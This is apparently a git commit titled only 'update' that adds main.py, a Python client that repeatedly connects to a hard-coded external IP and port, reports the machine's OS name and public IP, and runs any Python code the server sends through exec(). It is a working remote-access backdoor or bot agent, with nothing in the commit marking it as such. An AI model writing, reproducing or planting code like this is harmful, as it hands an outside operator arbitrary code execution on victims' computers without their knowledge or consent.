66f8d225874bbcf88fbe93be71f5791dfc3deb77
hoangks5 <hoangnd.ute@gmail.com>
2024-09-04 16:59:04 +0700

    update

---
+++ main.py
@@ -0,0 +1,52 @@
+import socket
+import json
+import os
+
+import requests
+
+def get_ip():
+    return requests.get('https://api.ipify.org').text
+
+
+while True:
+    try:
+        # Create a socket object
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # Connect to the server
+        server_address = ('3.18.29.6', 12345)
+        client_socket.connect(server_address)
+        command = {
+            'cmd': 'add',
+            'result': {
+                'name': os.name,
+                'ip': get_ip()
+            }
+        }
+        json_command = json.dumps(command)
+        client_socket.sendall(json_command.encode())
+        
+        
+        
+        
+        data = client_socket.recv(1024).decode()
+        data = json.loads(data)
+        if data['cmd'] == 'python':
+            code = data['code']
+            try:
+                exec(code)
+                client_socket.sendall(json.dumps({
+                    'cmd': 'success',
+                    'result': 'Success'
+                }).encode())
+            except Exception as e:
+                client_socket.sendall(json.dumps({
+                    'cmd': 'error',
+                    'result': str(e)
+                }).encode())
+
+        if data['cmd'] == 'ping':
+            print('Pong')
+            
+    except Exception as e:
+        print(e)
+    
